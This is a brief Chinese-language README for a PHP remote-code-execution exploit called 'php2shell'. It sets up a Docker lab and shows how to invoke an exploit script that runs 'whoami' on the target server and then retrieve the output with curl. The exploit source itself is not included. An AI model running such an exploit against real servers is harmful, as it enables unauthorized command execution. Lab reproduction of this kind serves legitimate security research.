# php2shell

## 环境安装

```
docker run -d --name lab -p 8081:80 php:8.5-apache

docker cp remote_app.php lab:/var/www/html/remote_app.php
```

## 复现

第一次执行较慢，会生成缓存文件，第二次快很多。

```
python3 php2shell_exp.py \
  --url http://xxx:8081/remote_app.php \
  --command 'whoami>www' --attempts 3 --max-seconds 800

curl http://xxx:8081/www
```
